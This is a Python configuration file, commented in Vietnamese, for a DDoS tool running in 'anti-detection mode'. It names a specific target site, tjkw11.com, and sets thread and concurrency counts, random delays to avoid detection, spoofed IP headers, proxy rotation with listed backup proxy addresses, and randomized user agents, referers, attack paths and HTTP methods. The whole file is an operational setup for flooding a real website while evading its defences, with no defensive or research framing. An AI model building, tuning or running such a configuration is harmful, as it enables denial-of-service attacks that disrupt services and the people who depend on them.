# Cấu hình cho DDoS tool - Anti-Detection Mode

# ===== CẤU HÌNH CƠ BẢN =====
TARGET_URL = "https://tjkw11.com/"

# ===== CẤU HÌNH THREADS & PERFORMANCE =====
NUM_THREADS = 30          # Số threads đồng bộ (giảm để tránh phát hiện)
ASYNC_THREADS = 8         # Số threads bất đồng bộ
CONCURRENT_REQUESTS = 15  # Số request đồng thời mỗi async thread
MAX_WORKERS = 50          # Số workers tối đa

# ===== CẤU HÌNH ANTI-DETECTION =====
USE_PROXIES = False       # Bật/tắt sử dụng proxy (TẠM THỜI TẮT ĐỂ TEST)
USE_DELAYS = True         # Bật/tắt delay ngẫu nhiên
ROTATE_IP_HEADERS = True  # Bật/tắt giả mạo IP headers
USE_FRESH_PROXIES = True  # Tự động lấy proxy mới từ internet

# ===== CẤU HÌNH DELAY =====
MIN_DELAY = 0.2           # Delay tối thiểu (giây)
MAX_DELAY = 3.0           # Delay tối đa (giây)
BATCH_DELAY_MIN = 0.1     # Delay tối thiểu giữa các batch async
BATCH_DELAY_MAX = 0.8     # Delay tối đa giữa các batch async

# ===== CẤU HÌNH TIMEOUT =====
CONNECT_TIMEOUT = 8       # Timeout kết nối (giây)
READ_TIMEOUT = 15         # Timeout đọc dữ liệu (giây)
PROXY_TIMEOUT = 10        # Timeout cho proxy test (giây)

# ===== CẤU HÌNH PROXY =====
MAX_PROXY_TEST = 80       # Số proxy tối đa để test
PROXY_TEST_WORKERS = 30   # Số workers để test proxy
PROXY_REFRESH_INTERVAL = 300  # Thời gian refresh proxy (giây)

# ===== CẤU HÌNH HEADERS =====
ENABLE_REFERER = True     # Thêm referer ngẫu nhiên
ENABLE_ACCEPT_LANGUAGE = True  # Thêm accept-language ngẫu nhiên
ENABLE_SEC_HEADERS = True # Thêm sec-fetch headers

# ===== CẤU HÌNH LOGGING =====
LOG_FREQUENCY = 20        # Hiển thị log mỗi X requests
SHOW_PROXY_INFO = True    # Hiển thị thông tin proxy trong log
SHOW_DETAILED_STATS = True # Hiển thị thống kê chi tiết

# ===== CẤU HÌNH NÂNG CAO =====
ENABLE_MULTIPROCESSING = False  # Bật/tắt multiprocessing (có thể gây phát hiện)
RANDOMIZE_PATHS = True    # Random attack paths
RANDOMIZE_METHODS = True  # Random HTTP methods
RANDOMIZE_PARAMS = True   # Random parameters

# ===== DANH SÁCH USER AGENTS =====
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
]

# ===== DANH SÁCH ATTACK PATHS =====
ATTACK_PATHS = [
    '/',
    '/index.html',
    '/index.php',
    '/home',
    '/about',
    '/contact',
    '/login',
    '/admin',
    '/wp-admin',
    '/api',
    '/search',
    '/products',
    '/services',
    '/blog',
    '/news',
    '/support',
    '/help',
    '/faq',
    '/pricing',
    '/features',
]

# ===== DANH SÁCH HTTP METHODS =====
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']

# ===== DANH SÁCH REFERERS =====
REFERERS = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.twitter.com/',
    'https://www.instagram.com/',
    'https://www.linkedin.com/',
    'https://www.reddit.com/',
    'https://www.tiktok.com/',
    'https://www.pinterest.com/',
    'https://www.snapchat.com/',
]

# ===== DANH SÁCH ACCEPT-LANGUAGE =====
ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8',
    'ko-KR,ko;q=0.9,en;q=0.8',
    'es-ES,es;q=0.9,en;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'de-DE,de;q=0.9,en;q=0.8',
    'ru-RU,ru;q=0.9,en;q=0.8',
]

# ===== BACKUP PROXIES (fallback) =====
BACKUP_PROXIES = [
    'http://103.149.162.194:80',
    'http://103.149.162.195:80',
    'http://185.162.231.106:80',
    'http://185.162.231.107:80',
    'http://103.152.112.162:80',
    'http://103.152.112.145:80',
    'http://194.182.163.117:3128',
    'http://194.182.163.118:3128',
]